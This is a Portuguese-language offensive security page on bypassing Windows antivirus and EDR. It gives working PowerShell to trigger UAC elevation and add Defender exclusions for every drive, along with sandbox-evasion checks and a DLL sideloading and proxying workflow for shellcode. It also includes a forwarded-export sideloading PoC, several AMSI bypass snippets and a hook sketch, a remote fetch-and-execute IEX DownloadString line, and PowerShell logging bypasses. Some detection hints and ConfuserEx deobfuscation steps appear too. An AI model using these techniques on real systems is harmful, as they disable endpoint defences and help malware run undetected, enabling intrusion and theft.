# Bypass de Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Esta página foi inicialmente escrita por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Parar o Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uma ferramenta para impedir o funcionamento do Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Uma ferramenta para impedir o funcionamento do Windows Defender, falsificando outro AV.
- [Desativar o Defender se você for admin](basic-powershell-for-pentesters/README.md)

### Isca de UAC no estilo de instalador antes de adulterar o Defender

Loaders públicos que se passam frequentemente por cheats de jogos são distribuídos como instaladores Node.js/Nexe não assinados que primeiro **solicitam ao usuário elevação de privilégios** e só então neutralizam o Defender. O fluxo é simples:

1. Verifica se o contexto é administrativo usando `net session`. O comando só é bem-sucedido quando o chamador possui direitos de admin, portanto, uma falha indica que o loader está sendo executado como um usuário padrão.
2. Reinicia imediatamente a si mesmo com o verbo `RunAs` para acionar o prompt de consentimento UAC esperado, preservando a linha de comando original.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
As vítimas já acreditam que estão instalando software “cracked”, portanto o prompt geralmente é aceito, concedendo ao malware as permissões necessárias para alterar a política do Defender.<sup>[[26]](#references)</sup>

### Exclusões abrangentes de `MpPreference` para cada letra de unidade

Depois de obter elevação, as cadeias no estilo GachiLoader maximizam os pontos cegos do Defender em vez de desativar o serviço por completo. O loader primeiro encerra o watchdog da GUI (`taskkill /F /IM SecHealthUI.exe`) e, em seguida, aplica **exclusões extremamente abrangentes**, fazendo com que cada perfil de usuário, diretório do sistema e disco removível não possa ser verificado:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Observações principais:

- O loop percorre todos os sistemas de arquivos montados (D:\, E:\, dispositivos USB etc.), portanto **qualquer payload futuro colocado em qualquer local do disco será ignorado**.
- A exclusão da extensão `.sys` é preventiva — os atacantes mantêm a opção de carregar drivers unsigned posteriormente sem precisar alterar o Defender novamente.
- Todas as alterações são aplicadas em `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, permitindo que as etapas posteriores confirmem que as exclusões persistem ou as expandam sem disparar o UAC novamente.

Como nenhum serviço do Defender é interrompido, verificações de integridade ingênuas continuam informando “antivírus ativo”, embora a inspeção em tempo real nunca alcance esses caminhos.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Atualmente, os AVs usam diferentes métodos para verificar se um arquivo é malicioso ou não: detecção estática, análise dinâmica e, nos EDRs mais avançados, análise comportamental.

### **Detecção estática**

A detecção estática é realizada sinalizando strings maliciosas conhecidas ou arrays de bytes em um binário ou script, além de extrair informações do próprio arquivo (por exemplo, descrição do arquivo, nome da empresa, assinaturas digitais, ícone, checksum etc.). Isso significa que usar ferramentas públicas conhecidas pode fazer com que você seja detectado mais facilmente, pois elas provavelmente já foram analisadas e sinalizadas como maliciosas. Existem algumas maneiras de contornar esse tipo de detecção:

- **Criptografia**

Se você criptografar o binário, não haverá como o AV detectar seu programa, mas será necessário algum tipo de loader para descriptografar e executar o programa na memória.

- **Obfuscation**

Às vezes, tudo o que você precisa fazer é alterar algumas strings no seu binário ou script para fazê-lo passar pelo AV, mas isso pode ser uma tarefa demorada, dependendo do que você está tentando ofuscar.

- **Custom tooling**

Se você desenvolver suas próprias ferramentas, não haverá assinaturas maliciosas conhecidas, mas isso exige muito tempo e esforço.

> [!TIP]
> Uma boa maneira de verificar a detecção estática do Windows Defender é usar o [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ele basicamente divide o arquivo em vários segmentos e instrui o Defender a verificar cada um individualmente; dessa forma, pode informar exatamente quais strings ou bytes foram sinalizados no seu binário.

Recomendo muito que você confira esta [playlist do YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre AV Evasion na prática.

### **Análise dinâmica**

A análise dinâmica ocorre quando o AV executa seu binário em um sandbox e monitora atividades maliciosas (por exemplo, tentar descriptografar e ler as senhas do navegador, realizar um minidump no LSASS etc.). Essa parte pode ser um pouco mais difícil de lidar, mas há algumas coisas que você pode fazer para evadir sandboxes.

- **Sleep antes da execução** Dependendo de como é implementado, pode ser uma ótima maneira de contornar a análise dinâmica do AV. Os AVs têm pouquíssimo tempo para verificar arquivos sem interromper o fluxo de trabalho do usuário, portanto, usar sleeps longos pode atrapalhar a análise dos binários. O problema é que muitos sandboxes de AV podem simplesmente ignorar o sleep, dependendo de como ele é implementado.
- **Verificação dos recursos da máquina** Normalmente, os Sandboxes têm pouquíssimos recursos disponíveis (por exemplo, < 2GB de RAM), caso contrário, poderiam deixar a máquina do usuário mais lenta. Você também pode ser bastante criativo aqui, verificando, por exemplo, a temperatura da CPU ou até mesmo a velocidade das ventoinhas; nem tudo será implementado no sandbox.
- **Verificações específicas da máquina** Se você quiser atingir um usuário cuja workstation esteja ingressada no domínio "contoso.local", poderá verificar o domínio do computador para saber se corresponde ao especificado; caso não corresponda, você pode fazer o programa sair.

Descobriu-se que o computername do Microsoft Defender's Sandbox é HAL9TH. Portanto, você pode verificar o nome do computador no seu malware antes da detonação; se o nome corresponder a HAL9TH, significa que você está dentro do sandbox do Defender, então pode fazer o programa sair.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Algumas outras dicas realmente boas de [@mgeeky](https://twitter.com/mariuszbit) para lidar com Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p>canal #malware-dev do <a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a></p></figcaption></figure>

Como dissemos anteriormente neste post, as **public tools** eventualmente **serão detectadas**, então você deve se perguntar:

Por exemplo, se você quiser fazer dump do LSASS, **você realmente precisa usar mimikatz**? Ou poderia usar um projeto diferente, menos conhecido e que também faça dump do LSASS?

A resposta certa provavelmente é a última opção. Tomando o mimikatz como exemplo, ele provavelmente é uma das partes de malware mais sinalizadas pelos AVs e EDRs, se não for a mais sinalizada. Embora o projeto em si seja muito bom, também é um pesadelo trabalhar com ele para contornar AVs; portanto, procure alternativas para alcançar o que você está tentando fazer.

> [!TIP]
> Ao modificar seus payloads para evasão, certifique-se de **desativar o envio automático de amostras** no Defender e, por favor, falando sério, **NÃO FAÇA UPLOAD PARA O VIRUSTOTAL** se seu objetivo for manter a evasão no longo prazo. Se quiser verificar se seu payload é detectado por um AV específico, instale-o em uma VM, tente desativar o envio automático de amostras e faça os testes nela até ficar satisfeito com o resultado.

## EXEs vs DLLs

Sempre que possível, **priorize o uso de DLLs para evasão**. Na minha experiência, arquivos DLL geralmente são **muito menos detectados** e analisados; portanto, este é um truque muito simples para evitar a detecção em alguns casos (se o seu payload puder ser executado como uma DLL, é claro).

Como podemos ver nesta imagem, um DLL Payload do Havoc tem uma taxa de detecção de 4/26 no antiscan.me, enquanto o payload EXE tem uma taxa de detecção de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparação no antiscan.me entre um payload EXE normal do Havoc e uma DLL normal do Havoc</p></figcaption></figure>

Agora mostraremos alguns truques que você pode usar com arquivos DLL para ser muito mais stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** aproveita a ordem de pesquisa de DLL usada pelo loader, posicionando o aplicativo vítima e o(s) payload(s) malicioso(s) lado a lado.

Você pode verificar se há programas suscetíveis a DLL Sideloading usando o [Siofra](https://github.com/Cybereason/siofra) e o seguinte script powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Este comando exibirá a lista de programas suscetíveis a DLL hijacking dentro de "C:\Program Files\\" e os arquivos DLL que eles tentam carregar.

Recomendo fortemente que você **explore programas DLL Hijackable/Sideloadable por conta própria**; essa técnica é bastante furtiva quando executada corretamente, mas, se você usar programas DLL Sideloadable conhecidos publicamente, poderá ser facilmente detectado.

Apenas colocar uma DLL maliciosa com o nome que um programa espera carregar não fará com que seu payload seja carregado, pois o programa espera que determinadas funções estejam presentes nessa DLL. Para corrigir esse problema, usaremos outra técnica chamada **DLL Proxying/Forwarding**.

**DLL Proxying** encaminha as chamadas feitas por um programa do proxy (e malicioso) DLL para a DLL original, preservando assim a funcionalidade do programa e permitindo lidar com a execução do seu payload.

Usarei o projeto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik)

Estas são as etapas que segui:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
O último comando nos fornecerá 2 arquivos: um template de código-fonte de DLL e a DLL original renomeada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Tanto nosso shellcode (encoded com [SGN](https://github.com/EgeBalci/sgn)) quanto a proxy DLL têm uma taxa de detecção de 0/26 no [antiscan.me](https://antiscan.me)! Eu diria que isso foi um sucesso.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Eu **recomendo fortemente** que você assista à [VOD da Twitch de S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading e também ao [vídeo do ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) para aprender mais sobre o que discutimos em maior profundidade.

### Abusing Forwarded Exports (ForwardSideLoading)

Os módulos PE do Windows podem exportar funções que são, na verdade, "forwarders": em vez de apontar para código, a entrada de exportação contém uma string ASCII no formato `TargetDll.TargetFunc`. Quando um caller resolve a exportação, o Windows loader irá:

- Carregar `TargetDll` caso ainda não esteja carregada
- Resolver `TargetFunc` a partir dela

Principais comportamentos a compreender:
- Se `TargetDll` for uma KnownDLL, ela será fornecida a partir do namespace protegido KnownDLLs (por exemplo, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Se `TargetDll` não for uma KnownDLL, a ordem normal de busca de DLLs será usada, incluindo o diretório do módulo que está realizando a resolução do forward.

Isso possibilita uma primitiva de sideloading indireto: encontrar uma DLL assinada que exporte uma função encaminhada para um nome de módulo que não seja uma KnownDLL e, então, colocar essa DLL assinada no mesmo diretório que uma DLL controlada pelo atacante, nomeada exatamente como o módulo de destino encaminhado. Quando a exportação encaminhada for invocada, o loader resolve o forward e carrega sua DLL a partir do mesmo diretório, executando seu DllMain.<sup>[[13]](#references)</sup>

Exemplo observado no Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` não é uma KnownDLL, portanto é resolvida por meio da ordem de pesquisa normal.

PoC (copiar e colar):
1) Copie a DLL de sistema assinada para uma pasta com permissão de escrita
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Coloque uma `NCRYPTPROV.dll` maliciosa na mesma pasta. Um `DllMain` mínimo é suficiente para obter execução de código; você não precisa implementar a função encaminhada para acionar o `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Dispare o encaminhamento com um LOLBin assinado:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportamento observado:
- rundll32 (assinado) carrega o `keyiso.dll` side-by-side (assinado)
- Ao resolver `KeyIsoSetAuditingInterface`, o loader segue o forward para `NCRYPTPROV.SetAuditingInterface`
- O loader então carrega `NCRYPTPROV.dll` de `C:\test` e executa seu `DllMain`
- Se `SetAuditingInterface` não estiver implementada, você receberá um erro de "missing API" somente depois que `DllMain` já tiver sido executado

Dicas de hunting:
- Concentre-se em exports encaminhados em que o módulo de destino não seja um KnownDLL. Os KnownDLLs estão listados em `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Você pode enumerar exports encaminhados com ferramentas como:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulte o inventário de forwarders do Windows 11 para procurar candidatos: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideias de detecção/defesa:
- Monitore LOLBins (por exemplo, rundll32.exe) carregando DLLs assinadas a partir de caminhos que não sejam do sistema, seguido pelo carregamento de KnownDLLs com o mesmo nome base a partir desse diretório
- Gere alertas para cadeias de processos/módulos como: `rundll32.exe` → `keyiso.dll` não pertencente ao sistema → `NCRYPTPROV.dll` em caminhos graváveis pelo usuário
- Imponha políticas de integridade de código (WDAC/AppLocker) e negue permissões de gravação+execução em diretórios de aplicações

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Você pode usar o Freeze para carregar e executar seu shellcode de maneira furtiva.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion é apenas um jogo de gato e rato; o que funciona hoje pode ser detectado amanhã, portanto nunca dependa de apenas uma ferramenta; se possível, tente encadear múltiplas técnicas de evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs frequentemente colocam **user-mode inline hooks** nos stubs de syscall da `ntdll.dll`. Para ignorar esses hooks, você pode gerar stubs de syscall **direct** ou **indirect** que carregam o **SSN** (System Service Number) correto e fazem a transição para o kernel mode sem executar o entrypoint de exportação que contém o hook.<sup>[[32]](#references)</sup>

**Opções de invocação:**
- **Direct (embedded)**: emite uma instrução `syscall`/`sysenter`/`SVC #0` no stub gerado (sem atingir a exportação da `ntdll`).
- **Indirect**: salta para um gadget `syscall` existente dentro da `ntdll`, fazendo com que a transição para o kernel pareça ter origem na `ntdll` (útil para evasion heurística); **randomized indirect** escolhe um gadget de um pool por chamada.
- **Egg-hunt**: evita incorporar a sequência estática de opcode `0F 05` no disco; resolve uma sequência de syscall em runtime.

**Estratégias de resolução de SSN resistentes a hooks:**
- **FreshyCalls (VA sort)**: infere SSNs ordenando os stubs de syscall por endereço virtual em vez de ler os bytes do stub.
- **SyscallsFromDisk**: mapeia uma `\KnownDlls\ntdll.dll` limpa, lê os SSNs de seu `.text` e depois faz o unmap (ignora todos os hooks em memória).
- **RecycledGate**: combina a inferência de SSN por VA sort com a validação de opcode quando um stub está limpo; recorre à inferência por VA se houver hook.
- **HW Breakpoint**: define DR0 na instrução `syscall` e usa um VEH para capturar o SSN de `EAX` em runtime, sem analisar bytes com hook.

Exemplo de uso do SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI foi criado para impedir "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, os AVs só eram capazes de verificar **arquivos no disco**, portanto, se fosse possível executar payloads **diretamente na memória**, o AV não poderia fazer nada para impedi-lo, pois não tinha visibilidade suficiente.

O recurso AMSI está integrado a estes componentes do Windows.

- User Account Control, ou UAC (elevação de EXE, COM, MSI ou instalação de ActiveX)
- PowerShell (scripts, uso interativo e avaliação de código dinâmico)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript e VBScript
- macros VBA do Office

Isso permite que as soluções antivírus inspecionem o comportamento dos scripts, expondo o conteúdo dos scripts de uma forma não criptografada e não ofuscada.

Executar `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produzirá o alerta a seguir no Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Observe como ele adiciona `amsi:` e, em seguida, o caminho para o executável a partir do qual o script foi executado, neste caso, powershell.exe

Não gravamos nenhum arquivo no disco, mas ainda assim fomos detectados na memória devido ao AMSI.

Além disso, a partir do **.NET 4.8**, o código C# também passa pelo AMSI. Isso afeta inclusive `Assembly.Load(byte[])` para carregar uma execução na memória. Por isso, é recomendado usar versões inferiores do .NET (como 4.7.2 ou anteriores) para execução na memória, caso você queira evadir o AMSI.

Há algumas maneiras de contornar o AMSI:

- **Obfuscation**

Como o AMSI funciona principalmente com detecções estáticas, modificar os scripts que você tenta carregar pode ser uma boa forma de evadir a detecção.

No entanto, o AMSI é capaz de desofuscar scripts mesmo quando eles possuem várias camadas, portanto, a ofuscação pode ser uma opção ruim, dependendo de como é feita. Isso torna a evasão menos direta. Porém, às vezes, tudo o que você precisa fazer é alterar alguns nomes de variáveis e estará tudo certo; portanto, isso depende do quanto algo foi sinalizado.

- **AMSI Bypass**

Como o AMSI é implementado carregando uma DLL no processo do powershell (também cscript.exe, wscript.exe etc.), é possível adulterá-lo facilmente, mesmo executando como um usuário sem privilégios. Devido a essa falha na implementação do AMSI, pesquisadores encontraram várias maneiras de evadir o scan do AMSI.

**Forcing an Error**

Forçar a inicialização do AMSI a falhar (amsiInitFailed) fará com que nenhum scan seja iniciado para o processo atual. Isso foi originalmente divulgado por [Matt Graeber](https://twitter.com/mattifestation), e a Microsoft desenvolveu uma assinatura para impedir um uso mais amplo.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Tudo o que foi necessário foi uma única linha de código powershell para tornar o AMSI inutilizável no processo powershell atual. É claro que essa linha foi sinalizada pelo próprio AMSI, portanto, é necessária alguma modificação para utilizar essa técnica.

Aqui está um AMSI bypass modificado que obtive deste [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Tenha em mente que isso provavelmente será detectado assim que este post for publicado, portanto você não deve publicar nenhum código se o seu plano for permanecer indetectado.

**Memory Patching**

Essa técnica foi descoberta inicialmente por [@RastaMouse](https://twitter.com/_RastaMouse/) e envolve encontrar o endereço da função "AmsiScanBuffer" em amsi.dll (responsável por verificar as entradas fornecidas pelo usuário) e sobrescrevê-lo com instruções para retornar o código de E_INVALIDARG. Dessa forma, o resultado da verificação real retornará 0, que é interpretado como um resultado limpo.

> [!TIP]
> Leia [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para obter uma explicação mais detalhada.

Também existem muitas outras técnicas usadas para fazer bypass do AMSI com powershell. Consulte [**esta página**](basic-powershell-for-pentesters/index.html#amsi-bypass) e [**este repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para saber mais sobre elas.

### Bloqueando o AMSI ao impedir o carregamento de amsi.dll (LdrLoadDll hook)

O AMSI é inicializado somente depois que `amsi.dll` é carregada no processo atual. Um bypass robusto e independente de linguagem consiste em colocar um hook em modo de usuário sobre `ntdll!LdrLoadDll` que retorna um erro quando o módulo solicitado é `amsi.dll`. Como resultado, o AMSI nunca é carregado e nenhuma verificação ocorre nesse processo.<sup>[[23]](#references)</sup>

Esboço da implementação (pseudocódigo x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notas
- Funciona em PowerShell, WScript/CScript e custom loaders (qualquer coisa que, de outra forma, carregaria o AMSI).
- Combine com o envio de scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) para evitar artefatos longos na linha de comando.
- Já foi usado por loaders executados através de LOLBins (por exemplo, `regsvr32` chamando `DllRegisterServer`).

A ferramenta **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** também gera script para bypass do AMSI.
A ferramenta **[https://amsibypass.com/](https://amsibypass.com/)** também gera script para bypass do AMSI, evitando assinaturas por meio de funções e variáveis definidas pelo usuário, expressões de caracteres randomizadas e aplicação aleatória de maiúsculas e minúsculas às palavras-chave do PowerShell para evitar assinaturas.

**Remova a assinatura detectada**

Você pode usar uma ferramenta como **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** para remover a assinatura do AMSI detectada da memória do processo atual. Essa ferramenta funciona examinando a memória do processo atual em busca da assinatura do AMSI e, em seguida, sobrescrevendo-a com instruções NOP, removendo-a efetivamente da memória.

**Produtos AV/EDR que usam AMSI**

Você pode encontrar uma lista de produtos AV/EDR que usam AMSI em **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use a versão 2 do Powershell**
Se você usar a versão 2 do PowerShell, o AMSI não será carregado, permitindo executar seus scripts sem que sejam examinados pelo AMSI. Você pode fazer isso:
```bash
powershell.exe -version 2
```
## PS Logging

O logging do PowerShell é um recurso que permite registrar todos os comandos do PowerShell executados em um sistema. Isso pode ser útil para fins de auditoria e troubleshooting, mas também pode ser um **problema para atacantes que querem evadir a detecção**.

Para bypassar o logging do PowerShell, você pode usar as seguintes técnicas:

- **Disable PowerShell Transcription and Module Logging**: Você pode usar uma ferramenta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para essa finalidade.
- **Use Powershell version 2**: Se você usar o PowerShell versão 2, o AMSI não será carregado, portanto poderá executar seus scripts sem que sejam analisados pelo AMSI. Você pode fazer isso: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Use [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para iniciar um powershell sem defesas (é isso que o `powerpick` do Cobal Strike usa).


## Obfuscation

> [!TIP]
> Várias técnicas de obfuscation dependem da criptografia de dados, o que aumentará a entropia do binário e facilitará sua detecção por AVs e EDRs. Tenha cuidado com isso e talvez aplique a criptografia apenas a seções específicas do seu código que sejam sensíveis ou precisem ser ocultadas.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Ao analisar malware que usa o ConfuserEx 2 (ou forks comerciais), é comum encontrar várias camadas de proteção que bloqueiam decompilers e sandboxes. O workflow abaixo **restaura um IL quase original** que pode ser posteriormente decompilado para C# em ferramentas como dnSpy ou ILSpy.<sup>[[10]](#references)</sup>

1.  Anti-tampering removal – O ConfuserEx criptografa cada *method body* e o descriptografa dentro do construtor estático (`<Module>.cctor`) do *module*. Isso também altera o checksum do PE, portanto qualquer modificação fará o binário travar. Use o **AntiTamperKiller** para localizar as tabelas de metadados criptografadas, recuperar as chaves XOR e reescrever um assembly limpo:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
A saída contém os 6 parâmetros de anti-tampering (`key0-key3`, `nameHash`, `internKey`), que podem ser úteis ao criar seu próprio unpacker.

2.  Symbol / control-flow recovery – forneça o arquivo *clean* ao **de4dot-cex** (um fork do de4dot com suporte ao ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – seleciona o perfil do ConfuserEx 2
• o de4dot desfará o control-flow flattening, restaurará os namespaces, classes e nomes de variáveis originais e descriptografará as strings constantes.

3.  Proxy-call stripping – O ConfuserEx substitui chamadas diretas de métodos por wrappers leves (também conhecidos como *proxy calls*) para dificultar ainda mais a decompilação. Remova-os com o **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Após essa etapa, você deverá observar APIs .NET normais, como `Convert.FromBase64String` ou `AES.Create()`, em vez de funções wrapper opacas (`Class8.smethod_10`, …).

4.  Manual clean-up – execute o binário resultante no dnSpy, pesquise por grandes blobs Base64 ou pelo uso de `RijndaelManaged`/`TripleDESCryptoServiceProvider` para localizar o payload *real*. Frequentemente, o malware o armazena como um byte array codificado em TLV, inicializado dentro de `<Module>.byte_0`.

A cadeia acima restaura o fluxo de execução **sem precisar executar a amostra maliciosa** – útil ao trabalhar em uma workstation offline.

> 🛈  O ConfuserEx produz um atributo customizado chamado `ConfusedByAttribute`, que pode ser usado como um IOC para fazer a triagem automática de amostras.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): O objetivo deste projeto é fornecer um fork open-source do conjunto de compilação [LLVM](http://www.llvm.org/) capaz de oferecer maior segurança de software por meio de [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e proteção contra adulterações.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): O ADVobfuscator demonstra como usar a linguagem `C++11/14` para gerar, em tempo de compilação, código obfuscado sem utilizar nenhuma ferramenta externa e sem modificar o compilador.
- [**obfy**](https://github.com/fritzone/obfy): Adiciona uma camada de operações obfuscadas geradas pelo framework de metaprogramação de templates do C++, o que tornará um pouco mais difícil a vida da pessoa que deseja crackear a aplicação.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** O Alcatraz é um obfuscator de binários x64 capaz de obfuscar vários tipos diferentes de arquivos PE, incluindo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): O Metame é um mecanismo simples de código metamórfico para executáveis arbitrários.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): O ROPfuscator é um framework de obfuscação de código refinada para linguagens compatíveis com LLVM que utiliza ROP (return-oriented programming). O ROPfuscator obfusca um programa no nível do código assembly, transformando instruções comuns em cadeias ROP e frustrando nossa concepção natural de fluxo de controle normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): O Nimcrypt é um .NET PE Crypter escrito em Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** O Inceptor é capaz de converter EXE/DLL existentes em shellcode e então carregá-los

## SmartScreen & MoTW

Você pode ter visto esta tela ao baixar alguns executáveis da internet e executá-los.

O Microsoft Defender SmartScreen é um mecanismo de segurança destinado a proteger o usuário final contra a execução de aplicações potencialmente maliciosas.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

O SmartScreen funciona principalmente com uma abordagem baseada em reputação, o que significa que aplicações baixadas com pouca frequência acionarão o SmartScreen, alertando o usuário final e impedindo-o de executar o arquivo (embora o arquivo ainda possa ser executado clicando em More Info -> Run anyway).

